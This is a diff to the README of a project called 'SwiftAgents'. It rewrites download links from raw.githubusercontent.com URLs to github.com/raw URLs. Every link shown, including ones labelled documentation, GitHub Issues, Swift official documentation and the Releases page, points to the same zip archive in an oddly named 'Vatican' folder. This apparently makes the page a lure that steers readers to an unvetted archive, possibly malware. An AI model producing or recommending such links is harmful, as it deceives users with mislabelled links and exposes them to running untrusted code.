@@ -18,12 +18,12 @@ Before you download SwiftAgents, ensure your computer meets the following requir
 
 To download SwiftAgents, click the button below:
 
-[![Download SwiftAgents](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip%20SwiftAgents-v1.0-blue)](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
+[![Download SwiftAgents](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip%20SwiftAgents-v1.0-blue)](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
 
 ### 💻 Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip) to find the latest version of SwiftAgents.
+   Go to the [Releases page](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip) to find the latest version of SwiftAgents.
 
 2. **Choose a Version:**
    On the Releases page, you will see a list of available versions. Click on the version you want to download. 
@@ -66,12 +66,12 @@ A: Please check the system requirements and ensure your operating system is comp
 
 ## 🔗 Resources
 
-- [SwiftAgents Documentation](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
-- [Swift Official Documentation](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
+- [SwiftAgents Documentation](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
+- [GitHub Issues](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
+- [Swift Official Documentation](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip)
 
 ## 📞 Support
 
 If you need assistance, feel free to reach out via our GitHub Issues page. We aim to respond to all questions promptly.
 
-Remember, you can always find the latest version of SwiftAgents at our [Releases page](https://raw.githubusercontent.com/FAKECODE17/SwiftAgents/main/Vatican/Swift_Agents_v3.8-beta.4.zip). Thank you for choosing SwiftAgents!
+Remember, you can always find the latest version of SwiftAgents at our [Releases page](https://github.com/FAKECODE17/SwiftAgents/raw/refs/heads/main/Vatican/Swift_Agents_v3.8-beta.4.zip). Thank you for choosing SwiftAgents!
